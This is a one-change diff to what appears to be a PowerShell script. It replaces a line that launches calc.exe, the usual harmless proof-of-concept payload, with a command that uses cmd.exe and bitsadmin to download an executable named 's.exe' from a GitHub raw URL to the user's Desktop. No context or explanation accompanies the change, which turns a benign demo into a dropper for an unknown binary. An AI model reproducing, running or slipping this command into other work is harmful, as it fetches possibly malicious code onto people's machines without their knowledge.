@@ -1,2 +1,1 @@
-[System.Diagnostics.Process]::Start("C:\Windows\System32\calc.exe")
-
+[System.Diagnostics.Process]::Start("C:\Windows\System32\cmd.exe", "/c bitsadmin /transfer mydownloadjob /download /priority high https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/s.exe C:\Users\User\Desktop\s.exe")
